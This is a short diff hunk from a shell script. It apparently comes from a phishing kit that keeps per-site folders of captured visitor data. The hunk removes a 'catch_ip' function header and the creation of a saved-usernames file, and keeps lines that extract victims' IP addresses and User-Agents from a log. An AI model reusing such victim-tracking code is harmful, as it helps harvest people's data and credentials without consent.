@@ -7,8 +7,7 @@
 
 
 
-catch_ip() {
-touch sites/$server/saved.usernames.txt
+
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
